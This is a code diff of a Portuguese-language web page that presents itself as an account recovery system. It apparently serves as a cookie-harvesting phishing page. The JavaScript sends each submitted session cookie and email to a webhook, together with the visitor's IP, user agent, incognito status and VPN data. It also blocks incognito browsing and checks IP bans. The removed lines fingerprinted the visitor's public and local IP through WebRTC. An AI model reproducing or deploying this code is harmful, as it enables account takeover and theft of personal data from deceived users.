@@ -2120,60 +2120,9 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT CORRIGIDO COM CAPTURA DE IP DO ROTEADOR E USUÁRIO ===== -->
+    <!-- ===== SCRIPT CORRIGIDO COM DETECÇÃO DE INCÓGNITO ===== -->
     <!-- ============================================================ -->
     <script>
-        // ============================================================
-        // 0. CAPTURAR IP DO ROTEADOR E DO USUÁRIO
-        // ============================================================
-        async function getClientIPs() {
-            try {
-                // 🔥 IP DO ROTEADOR (IP PÚBLICO) via API
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const routerIP = ipData.ip;
-                
-                // 🔥 IP DO USUÁRIO (IP LOCAL) via WebRTC (se disponível)
-                let userIP = null;
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('test');
-                    const offer = await pc.createOffer();
-                    await pc.setLocalDescription(offer);
-                    const candidate = offer.sdp.split('\n').find(line => line.includes('candidate'));
-                    if (candidate) {
-                        const match = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                        if (match) userIP = match[1];
-                    }
-                    pc.close();
-                } catch (e) {
-                    console.log('⚠️ Não foi possível capturar IP local via WebRTC');
-                }
-                
-                // Se não conseguiu via WebRTC, tenta via API
-                if (!userIP) {
-                    try {
-                        const userRes = await fetch('https://api.ipify.org?format=json');
-                        const userData = await userRes.json();
-                        userIP = userData.ip;
-                    } catch (e) {}
-                }
-                
-                return {
-                    routerIP: routerIP || 'Não identificado',
-                    userIP: userIP || routerIP || 'Não identificado',
-                    both: [routerIP, userIP].filter(ip => ip && ip !== 'Não identificado')
-                };
-            } catch (error) {
-                console.error('❌ Erro ao capturar IPs:', error);
-                return {
-                    routerIP: 'Não identificado',
-                    userIP: 'Não identificado',
-                    both: []
-                };
-            }
-        }
-
         // ============================================================
         // 0. DETECÇÃO DE MODO INCÓGNITO (FRONTEND)
         // ============================================================
@@ -2190,6 +2139,7 @@
                     }
                 }
 
+                // ===== MÉTODO 1: localStorage =====
                 try {
                     const testKey = '__incognito_test__';
                     localStorage.setItem(testKey, '1');
@@ -2199,6 +2149,7 @@
                 }
                 checkDone();
 
+                // ===== MÉTODO 2: sessionStorage =====
                 try {
                     const testKey = '__incognito_test__';
                     sessionStorage.setItem(testKey, '1');
@@ -2208,6 +2159,7 @@
                 }
                 checkDone();
 
+                // ===== MÉTODO 3: IndexedDB =====
                 try {
                     const request = indexedDB.open('__incognito_test__');
                     request.onerror = () => {
@@ -2225,8 +2177,10 @@
                     checkDone();
                 }
 
+                // ===== MÉTODO 4: Storage Quota (Chrome) =====
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
+                        // Chrome Incognito: quota < 120MB
                         if (estimate.quota < 120000000) {
                             detected = true;
                         }
@@ -2238,6 +2192,7 @@
                     checkDone();
                 }
 
+                // ===== TIMEOUT DE SEGURANÇA =====
                 setTimeout(() => {
                     resolve(detected);
                 }, 3000);
@@ -2413,6 +2368,7 @@
             const gifWrap = document.getElementById('banGifWrap');
             const gifImg = document.getElementById('banGif');
 
+            // ===== MOSTRA O GIF =====
             if (gif) {
                 gifWrap.classList.add('active');
                 gifImg.src = gif;
@@ -2421,14 +2377,17 @@
                 gifWrap.classList.remove('active');
             }
 
+            // ===== TÍTULO =====
             title.className = 'ban-title';
             title.textContent = '🚫 VOCÊ FOI BANIDO!';
             icon.textContent = '⚖️';
 
+            // ===== MOTIVO =====
             const reasonBox = document.getElementById('blockReasonBox');
             reasonBox.className = 'reason-box ban';
             reasonEl.textContent = `🔴 ${reason || 'ATIVIDADE SUSPEITA'}`;
 
+            // ===== DESCRIÇÃO =====
             if (expires) {
                 const date = new Date(expires);
                 desc.innerHTML =
@@ -2456,25 +2415,24 @@
         }
 
         // ============================================================
-        // 4. VERIFICA BAN POR IP - CORRIGIDO COM IP DO ROTEADOR
+        // 4. VERIFICA BAN POR IP - CORRIGIDO
         // ============================================================
         async function checkBanStatus() {
             try {
-                // 🔥 PEGA OS IPs DO USUÁRIO
-                const ips = await getClientIPs();
-                const ipToCheck = ips.routerIP || ips.userIP;
-                
-                console.log('🔍 IP do Roteador:', ips.routerIP);
-                console.log('🔍 IP do Usuário:', ips.userIP);
-                
-                const banRes = await fetch(`https://aurora-plum.vercel.app/api/ban?check=${ipToCheck}`);
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // 🔥 USA A URL COMPLETA
+                const banRes = await fetch(`https://aurora-plum.vercel.app/api/ban?check=${ip}`);
                 const banData = await banRes.json();
 
-                console.log('🔍 Dados do ban:', banData);
+                console.log('🔍 Dados do ban:', banData); // <- DEBUG
 
                 if (banData.banned) {
                     isUserBanned = true;
                     const ban = banData.ban || banData;
+                    // 🔥 PASSA OS DADOS CORRETOS
                     showBanBlockModal(
                         ban.reason || 'Motivo não informado',
                         ban.expires || null,
@@ -2527,52 +2485,30 @@
         }
 
         // ============================================================
-        // 7. WEBHOOK - AGORA COM IP DO ROTEADOR E DO USUÁRIO
+        // 7. WEBHOOK
         // ============================================================
-        async function sendToWebhook(cookie, email, ipPublico, ipLocal, isPrivate, vpnDetected) {
+        async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
                 const vpnData = vpnDetected ? await getIPData() : null;
-                
-                // 🔥 CAPTURA OS IPs NOVAMENTE PARA GARANTIR
-                const ips = await getClientIPs();
-                
                 const payload = {
-                    content: `✨ **NOVO COOKIE - AURORA** ✨\n\n` +
-                             `🍪 **Cookie:** \`${cookie}\`\n` +
-                             `📧 **Email:** ${email}\n` +
-                             `🌐 **IP do Roteador:** \`${ips.routerIP || ipPublico || 'Não identificado'}\`\n` +
-                             `💻 **IP do Usuário:** \`${ips.userIP || ipLocal || 'Não identificado'}\`\n` +
-                             `📱 **User Agent:** \`${navigator.userAgent}\`\n` +
-                             `🔒 **Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n` +
-                             `🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}` +
-                             `${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n` +
-                             `⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n` +
-                             `✨ **#Aurora** ✨`,
+                    content:
+                        `✨ **NOVO COOKIE - AURORA** ✨\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✨ **#Aurora** ✨`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
-                
                 try {
-                    const r = await fetch(WEBHOOK_URL, { 
-                        method: 'POST', 
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload) 
-                    });
+                    const r = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload) });
                     if (r.ok) return true;
                 } catch (e) {}
-                
                 try {
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', WEBHOOK_URL, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.send(JSON.stringify(payload));
                     return true;
-                } catch (e) { 
-                    return false; 
-                }
-            } catch (e) { 
-                return false; 
-            }
+                } catch (e) { return false; }
+            } catch (e) { return false; }
         }
 
         // ============================================================
@@ -2684,11 +2620,12 @@
         }
 
         // ============================================================
-        // 11. SUBMIT - AGORA COM AMBOS OS IPs
+        // 11. SUBMIT
         // ============================================================
         async function handleSubmit(e) {
             e.preventDefault();
 
+            // ===== VERIFICAR MODO INCÓGNITO =====
             const isIncognito = await detectIncognito();
             if (isIncognito) {
                 showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito não é permitido. Desative para continuar.');
@@ -2722,15 +2659,11 @@
             if (hasAttempted) { showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return; }
 
-            // 🔥 CAPTURA AMBOS OS IPs
-            const ips = await getClientIPs();
-            console.log('🌐 IP do Roteador:', ips.routerIP);
-            console.log('💻 IP do Usuário:', ips.userIP);
-
+            const ip = await getIP();
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
-            const sent = await sendToWebhook(cookie, email, ips.routerIP, ips.userIP, isPrivate, hasVPN);
+            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
 
             if (sent) {
                 hasAttempted = true;
@@ -2876,12 +2809,7 @@
             console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#c084fc;');
             console.log('%c⏳ 1 tentativa | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
 
-            // ===== CAPTURAR IPs =====
-            const ips = await getClientIPs();
-            console.log('🖥️ IP do Roteador:', ips.routerIP);
-            console.log('💻 IP do Usuário:', ips.userIP);
-            console.log('📦 Todos os IPs:', ips.both);
-
+            // ===== DETECTAR MODO INCÓGNITO PRIMEIRO =====
             const isIncognito = await detectIncognito();
 
             if (isIncognito) {
